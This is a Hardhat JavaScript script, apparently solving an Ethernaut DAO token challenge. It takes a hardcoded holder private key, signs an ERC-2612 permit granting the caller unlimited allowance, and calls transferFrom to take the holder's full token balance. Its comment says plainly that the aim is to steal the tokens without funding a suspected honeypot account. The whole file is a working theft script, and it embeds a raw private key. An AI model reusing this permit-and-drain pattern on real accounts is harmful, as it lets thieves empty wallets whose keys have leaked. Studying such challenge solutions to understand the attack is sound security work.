const hre = require("hardhat");
const { signERC2612Permit } = require('eth-permit');
const { ethers } = hre;

const tokenAddress = '0xf3cfa05f1ed0f5eb7a8080f1109ad7e424902121';
const privateKey = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80';

// We have the private key of the token holder but looks like this is a honey pot which
// will steal our ETH if we transfer to it to pay for gas fees (the account balance is at 0).
// Instead we can use permit to sign the approval using the account's private key and then
// simply use transferFrom to steal the tokens.
async function main() {
  const [signer] = await ethers.getSigners();

  const wallet = new ethers.Wallet(privateKey, ethers.provider);
  const senderAddress = await wallet.getAddress();

  const value = ethers.constants.MaxUint256;
  const result = await signERC2612Permit(wallet, tokenAddress, senderAddress, signer.address, value);

  const EthernautDaoToken = await ethers.getContractFactory("EthernautDaoToken");
  const token = EthernautDaoToken.attach(tokenAddress);

  const permitTx = await token.permit(senderAddress, signer.address, value, result.deadline, result.v, result.r, result.s);
  console.log('Permit TX: ', permitTx.hash);
  await permitTx.wait();

  const balance = await token.balanceOf(senderAddress);

  const transferTx = await token.transferFrom(senderAddress, signer.address, balance);
  console.log('Transfer TX: ', transferTx.hash);
  await transferTx.wait();

  console.log('Done!');
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });

